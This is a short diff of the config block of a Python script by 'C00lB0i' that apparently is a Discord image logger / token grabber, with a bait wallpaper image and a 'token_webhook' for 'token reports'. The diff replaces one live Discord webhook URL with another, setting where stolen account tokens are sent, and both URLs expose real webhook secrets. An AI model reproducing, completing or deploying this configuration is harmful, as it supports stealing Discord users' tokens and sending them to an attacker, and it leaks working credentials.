@@ -19,7 +19,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
-    "token_webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",  # Webhook for token reports
+    "token_webhook": "https://discord.com/api/webhooks/1445500187064664095/SD2nrNQvqRd54oLbI2TD3Hk_tbAtOCXZCXpOgT1W1xE11u2hwh7CPnkFjaDqkYhDCsFd",  # Webhook for token reports
     "image": "https://server.wallpaperalchemy.com/storage/wallpapers/92/windows-xp-wallpaper-bliss-4k-wallpaper.jpeg",
     "imageArgument": True,
 
